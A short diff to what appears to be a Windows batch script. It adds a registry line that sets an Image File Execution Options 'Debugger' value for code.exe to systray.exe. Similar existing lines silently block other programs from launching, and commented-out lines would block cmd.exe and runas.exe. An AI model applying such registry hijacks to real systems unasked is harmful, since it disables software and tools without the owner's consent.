@@ -206,6 +206,7 @@ reg add "%IFEO%\VideoPlayer.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\J-Player.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\Registry_Management.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 reg add "%IFEO%\iexplore.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
+reg add "%IFEO%\code.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 REM reg add "%IFEO%\cmd.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 REM reg add "%IFEO%\seclogon.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
 REM reg add "%IFEO%\runas.exe" /v Debugger /t REG_SZ /d "systray.exe" /f
